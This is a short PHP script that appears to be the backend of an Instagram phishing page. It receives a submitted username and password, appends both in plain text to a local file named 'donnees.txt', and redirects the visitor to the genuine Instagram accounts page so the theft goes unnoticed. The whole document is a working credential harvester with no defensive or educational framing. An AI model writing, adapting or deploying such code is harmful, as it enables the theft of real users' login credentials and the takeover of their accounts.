<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $username = $_POST["username"] ?? "";
    $password = $_POST["password"] ?? "";

    $file = "donnees.txt";


    $content = "Username: " . $username . "\nPassword: " . $password . "\n\n";
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);

    header("Location: https://www.instagram.com/accounts/?hl=en");
    exit();
}
?>
